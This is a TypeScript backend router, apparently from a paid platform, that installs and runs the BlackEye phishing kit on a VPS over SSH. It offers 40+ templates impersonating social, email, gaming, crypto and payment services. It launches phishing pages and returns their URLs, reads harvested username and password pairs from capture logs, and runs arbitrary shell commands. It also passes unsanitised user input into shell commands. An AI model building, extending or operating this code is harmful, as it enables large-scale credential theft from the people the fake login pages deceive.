/**
 * BlackEye Router — Backend tRPC endpoints for managing BlackEye
 * phishing page infrastructure via SSH. Titan-tier exclusive feature.
 *
 * Uses the EricksonAtHome/blackeye fork (latest, 2025) which supports
 * 40+ phishing templates including major social platforms, banks, and
 * streaming services.
 *
 * All operations execute on the user's configured VPS via SSH.
 * Credentials are AES-256 encrypted at rest.
 */
import { z } from "zod";
import { router, protectedProcedure } from "./_core/trpc";
import { TRPCError } from "@trpc/server";
import { getUserPlan, enforceFeature } from "./subscription-gate";
import { getDb } from "./db";
import { userSecrets } from "../drizzle/schema";
import { eq, and } from "drizzle-orm";
import { Client as SSHClient } from "ssh2";
import { encrypt, decrypt } from "./fetcher-db";
import { consumeCredits } from "./credit-service";
import { getTitanServerConfig, execSSHCommand as execTitanSSH } from "./titan-server";
import { logAdminAction } from "./admin-activity-log";

// ─── Available BlackEye Templates ────────────────────────────────
export const BLACKEYE_TEMPLATES = [
  { id: "instagram", name: "Instagram", category: "Social Media", icon: "📸" },
  { id: "facebook", name: "Facebook", category: "Social Media", icon: "👤" },
  { id: "snapchat", name: "Snapchat", category: "Social Media", icon: "👻" },
  { id: "twitter", name: "Twitter / X", category: "Social Media", icon: "🐦" },
  { id: "linkedin", name: "LinkedIn", category: "Social Media", icon: "💼" },
  { id: "tiktok", name: "TikTok", category: "Social Media", icon: "🎵" },
  { id: "pinterest", name: "Pinterest", category: "Social Media", icon: "📌" },
  { id: "reddit", name: "Reddit", category: "Social Media", icon: "🤖" },
  { id: "discord", name: "Discord", category: "Social Media", icon: "💬" },
  { id: "telegram", name: "Telegram", category: "Social Media", icon: "✈️" },
  { id: "whatsapp", name: "WhatsApp", category: "Social Media", icon: "💚" },
  { id: "google", name: "Google", category: "Email / Accounts", icon: "🔍" },
  { id: "gmail", name: "Gmail", category: "Email / Accounts", icon: "📧" },
  { id: "microsoft", name: "Microsoft", category: "Email / Accounts", icon: "🪟" },
  { id: "outlook", name: "Outlook", category: "Email / Accounts", icon: "📨" },
  { id: "yahoo", name: "Yahoo", category: "Email / Accounts", icon: "🟣" },
  { id: "apple", name: "Apple iCloud", category: "Email / Accounts", icon: "🍎" },
  { id: "dropbox", name: "Dropbox", category: "Cloud Storage", icon: "📦" },
  { id: "github", name: "GitHub", category: "Developer", icon: "🐙" },
  { id: "gitlab", name: "GitLab", category: "Developer", icon: "🦊" },
  { id: "twitch", name: "Twitch", category: "Streaming", icon: "🎮" },
  { id: "netflix", name: "Netflix", category: "Streaming", icon: "🎬" },
  { id: "spotify", name: "Spotify", category: "Streaming", icon: "🎵" },
  { id: "steam", name: "Steam", category: "Gaming", icon: "🎮" },
  { id: "epicgames", name: "Epic Games", category: "Gaming", icon: "🎯" },
  { id: "roblox", name: "Roblox", category: "Gaming", icon: "🧱" },
  { id: "paypal", name: "PayPal", category: "Financial", icon: "💳" },
  { id: "coinbase", name: "Coinbase", category: "Financial", icon: "₿" },
  { id: "binance", name: "Binance", category: "Financial", icon: "🟡" },
  { id: "ebay", name: "eBay", category: "E-Commerce", icon: "🛒" },
  { id: "amazon", name: "Amazon", category: "E-Commerce", icon: "📦" },
  { id: "wordpress", name: "WordPress", category: "CMS", icon: "📝" },
  { id: "adobe", name: "Adobe", category: "Creative", icon: "🎨" },
  { id: "origin", name: "Origin / EA", category: "Gaming", icon: "🕹️" },
  { id: "protonmail", name: "ProtonMail", category: "Email / Accounts", icon: "🔒" },
  { id: "vk", name: "VK", category: "Social Media", icon: "🌐" },
  { id: "badoo", name: "Badoo", category: "Social Media", icon: "❤️" },
  { id: "quora", name: "Quora", category: "Social Media", icon: "❓" },
  { id: "mediafire", name: "MediaFire", category: "Cloud Storage", icon: "🔥" },
  { id: "gitlab_enterprise", name: "GitLab Enterprise", category: "Developer", icon: "🦊" },
  { id: "custom", name: "Custom Page", category: "Custom", icon: "⚙️" },
] as const;

// ─── SSH Execution Helper ─────────────────────────────────────────
interface SSHConfig {
  host: string;
  port: number;
  username: string;
  password?: string;
  privateKey?: string;
}

async function execSSHCommand(
  ssh: SSHConfig,
  command: string,
  timeoutMs = 20000,
  userId?: number
): Promise<string> {
  if ((ssh as any).isTitanServer && userId) {
    return execTitanSSH(ssh as any, command, timeoutMs, userId);
  }
  return new Promise((resolve, reject) => {
    const conn = new SSHClient();
    let output = "";
    let errorOutput = "";
    const timer = setTimeout(() => {
      conn.end();
      reject(new Error("SSH command timed out"));
    }, timeoutMs);
    conn
      .on("ready", () => {
        conn.exec(command, (err: Error | undefined, stream: import('ssh2').ClientChannel) => {
          if (err) {
            clearTimeout(timer);
            conn.end();
            reject(err);
            return;
          }
          stream
            .on("close", () => {
              clearTimeout(timer);
              conn.end();
              resolve(output.trim());
            })
            .on("data", (data: Buffer) => {
              output += data.toString();
            })
            .stderr.on("data", (data: Buffer) => {
              errorOutput += data.toString();
            });
        });
      })
      .on("error", (err: Error) => {
        clearTimeout(timer);
        reject(err);
      })
      .connect({
        host: ssh.host,
        port: ssh.port,
        username: ssh.username,
        password: ssh.password || undefined,
        privateKey: ssh.privateKey || undefined,
        readyTimeout: 5000,
      });
  });
}

// ─── Helper: Get SSH Config ───────────────────────────────────────
async function getSshConfig(userId: number) {
  const db = await getDb();
  if (!db) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "Database unavailable" });
  const result = await db
    .select()
    .from(userSecrets)
    .where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, "__blackeye_ssh")))
    .limit(1);
  
  if (result.length === 0) {
    // Fallback to shared Titan Server if configured
    const titanConfig = getTitanServerConfig();
    if (titanConfig) {
      return titanConfig;
    }
    throw new TRPCError({
      code: "BAD_REQUEST",
      message: "No BlackEye server configured. Please set up your SSH connection first.",
    });
  }
  return JSON.parse(decrypt(result[0].encryptedValue)) as SSHConfig;
}

// ─── Router ───────────────────────────────────────────────────────
export const blackeyeRouter = router({
  /**
   * List all available phishing templates
   */
  listTemplates: protectedProcedure.query(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
    return { templates: BLACKEYE_TEMPLATES };
  }),

  /**
   * Test SSH connection to the BlackEye server
   */
  testConnection: protectedProcedure
    .input(
      z.object({
        host: z.string().min(1),
        port: z.number().default(22),
        username: z.string().min(1),
        password: z.string().optional(),
        privateKey: z.string().optional(),
      })
    )
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
      try {
        const result = await execSSHCommand(input, "echo 'BlackEye connection OK' && ls /opt/blackeye 2>/dev/null || echo 'BlackEye not installed'", 8000, ctx.user.id);
        const installed = result.includes("blackeye.sh") || result.includes("sites");
        return {
          success: true,
          message: installed ? "Connected — BlackEye detected" : "Connected — BlackEye not yet installed",
          installed,
          raw: result,
        };
      } catch (err: any) {
        return { success: false, message: err.message || "Connection failed", installed: false };
      }
    }),

  /**
   * Save SSH connection details for the user's BlackEye server
   */
  saveConnection: protectedProcedure
    .input(
      z.object({
        host: z.string().min(1),
        port: z.number().default(22),
        username: z.string().min(1),
        password: z.string().optional(),
        privateKey: z.string().optional(),
      })
    )
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
      const db = await getDb();
      if (!db) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "Database unavailable" });
      const configJson = encrypt(JSON.stringify(input));
      const existing = await db
        .select()
        .from(userSecrets)
        .where(and(eq(userSecrets.userId, ctx.user.id), eq(userSecrets.secretType, "__blackeye_ssh")))
        .limit(1);
      if (existing.length > 0) {
        await db
          .update(userSecrets)
          .set({ encryptedValue: configJson, updatedAt: new Date() })
          .where(eq(userSecrets.id, existing[0].id));
      } else {
        await db.insert(userSecrets).values({
          userId: ctx.user.id,
          secretType: "__blackeye_ssh",
          label: "BlackEye SSH Config",
          encryptedValue: configJson,
        });
      }
      return { success: true };
    }),

  /**
   * Get saved SSH connection (masked)
   */
  getConnection: protectedProcedure.query(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
    const db = await getDb();
    if (!db) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR" });
    const result = await db
      .select()
      .from(userSecrets)
      .where(and(eq(userSecrets.userId, ctx.user.id), eq(userSecrets.secretType, "__blackeye_ssh")))
      .limit(1);
    if (result.length === 0) return null;
    const config = JSON.parse(decrypt(result[0].encryptedValue)) as SSHConfig;
    return {
      host: config.host,
      port: config.port,
      username: config.username,
      hasPassword: !!config.password,
      hasKey: !!config.privateKey,
    };
  }),

  /**
   * Install BlackEye (EricksonAtHome fork — latest 2025) on the server
   */
  install: protectedProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
    const sshConfig = await getSshConfig(ctx.user.id);
    const installScript = [
      "apt-get update -qq",
      "apt-get install -y git curl php unzip 2>/dev/null",
      "rm -rf /opt/blackeye",
      "git clone https://github.com/EricksonAtHome/blackeye /opt/blackeye 2>&1",
      "chmod +x /opt/blackeye/blackeye.sh",
      "echo 'BlackEye installed successfully at /opt/blackeye'",
    ].join(" && ");
    const output = await execSSHCommand(sshConfig, installScript, 60000, ctx.user.id);
    return { success: true, output };
  }),

  /**
   * Check BlackEye installation status and version
   */
  getStatus: protectedProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
    const sshConfig = await getSshConfig(ctx.user.id);
    const output = await execSSHCommand(
      sshConfig, "ls /opt/blackeye/sites 2>/dev/null | wc -l; git -C /opt/blackeye log --oneline -1 2>/dev/null; ps aux | grep -c '[b]lackeye' || echo 0", 10000
    , ctx.user.id);
    const lines = output.split("\n").filter(Boolean);
    const templateCount = parseInt(lines[0] || "0");
    const lastCommit = lines[1] || "unknown";
    const runningCount = parseInt(lines[2] || "0");
    return {
      installed: templateCount > 0,
      templateCount,
      lastCommit,
      running: runningCount > 0,
    };
  }),

  /**
   * Launch a BlackEye phishing page for a given template
   */
  launch: protectedProcedure
    .input(
      z.object({
        template: z.string().min(1),
        port: z.number().default(80),
        customDomain: z.string().optional(),
      })
    )
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
      const sshConfig = await getSshConfig(ctx.user.id);
      // Kill any existing BlackEye instance on the port first
      const killCmd = `fuser -k ${input.port}/tcp 2>/dev/null; sleep 1`;
      await execSSHCommand(sshConfig, killCmd, 5000, ctx.user.id).catch(() => {});
      // Launch BlackEye with the selected template
      // The EricksonAtHome fork uses numbered menu options
      const templateMap: Record<string, number> = {
        instagram: 1, facebook: 2, snapchat: 3, twitter: 4, linkedin: 5,
        tiktok: 6, pinterest: 7, reddit: 8, discord: 9, telegram: 10,
        whatsapp: 11, google: 12, gmail: 13, microsoft: 14, outlook: 15,
        yahoo: 16, apple: 17, dropbox: 18, github: 19, gitlab: 20,
        twitch: 21, netflix: 22, spotify: 23, steam: 24, epicgames: 25,
        roblox: 26, paypal: 27, coinbase: 28, binance: 29, ebay: 30,
        amazon: 31, wordpress: 32, adobe: 33, origin: 34, protonmail: 35,
        vk: 36, badoo: 37, quora: 38, mediafire: 39, gitlab_enterprise: 40,
      };
      const templateNum = templateMap[input.template] || 1;
      // Run BlackEye in background with the template number piped in
      const launchCmd = `cd /opt/blackeye && nohup bash -c "echo '${templateNum}' | bash blackeye.sh" > /tmp/blackeye_${input.port}.log 2>&1 &`;
      await execSSHCommand(sshConfig, launchCmd, 10000, ctx.user.id);
      await new Promise(r => setTimeout(r, 2000));
      // Get the server's public IP for the phishing URL
      const ipOutput = await execSSHCommand(sshConfig, "curl -s ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}'", 5000, ctx.user.id);
      const serverIp = ipOutput.trim().split("\n")[0] || sshConfig.host;
      const phishingUrl = input.customDomain
        ? `http://${input.customDomain}`
        : `http://${serverIp}`;
      await consumeCredits(ctx.user.id, "blackeye_action", `BlackEye launch: ${input.template}`);
      return {
        success: true,
        phishingUrl,
        serverIp,
        template: input.template,
        logFile: `/tmp/blackeye_${input.port}.log`,
      };
    }),

  /**
   * Stop all running BlackEye instances
   */
  stop: protectedProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
    const sshConfig = await getSshConfig(ctx.user.id);
    const output = await execSSHCommand(
      sshConfig, "pkill -f blackeye.sh 2>/dev/null; fuser -k 80/tcp 2>/dev/null; fuser -k 8080/tcp 2>/dev/null; echo 'Stopped'", 10000
    , ctx.user.id);
    return { success: true, output };
  }),

  /**
   * Read captured credentials from the log file
   */
  getCaptured: protectedProcedure
    .input(z.object({ logFile: z.string().optional() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
      const sshConfig = await getSshConfig(ctx.user.id);
      const logPath = input.logFile || "/opt/blackeye/sites/*/usernames.txt";
      const output = await execSSHCommand(
        sshConfig, `cat ${logPath} 2>/dev/null || echo 'No captures yet'`, 10000
      , ctx.user.id);
      // Parse captures: each line is typically "username:password" or "email:password"
      const captures = output
        .split("\n")
        .filter(line => line.includes(":") && !line.startsWith("#"))
        .map((line, idx) => {
          const [username, ...rest] = line.split(":");
          return {
            id: idx + 1,
            username: username?.trim() || "",
            password: rest.join(":").trim(),
            capturedAt: new Date().toISOString(),
          };
        });
      return { captures, raw: output };
    }),

  /**
   * Get the live log output from a running BlackEye session
   */
  getLogs: protectedProcedure
    .input(z.object({ lines: z.number().default(50) }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
      const sshConfig = await getSshConfig(ctx.user.id);
      const output = await execSSHCommand(
        sshConfig, `tail -${input.lines} /tmp/blackeye_80.log 2>/dev/null || echo 'No active session log found'`, 10000
      , ctx.user.id);
      return { output };
    }),

  /**
   * Update BlackEye to the latest version
   */
  update: protectedProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
    const sshConfig = await getSshConfig(ctx.user.id);
    const output = await execSSHCommand(
      sshConfig, "cd /opt/blackeye && git pull origin master 2>&1 && echo 'Updated successfully'", 30000
    , ctx.user.id);
    return { success: true, output };
  }),

  /**
   * Run a raw SSH command on the BlackEye server (admin use)
   */
  runCommand: protectedProcedure
    .input(z.object({ command: z.string().min(1).max(500) }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
      const sshConfig = await getSshConfig(ctx.user.id);
      const output = await execSSHCommand(sshConfig, input.command, 15000, ctx.user.id);
      return { output };
    }),
});
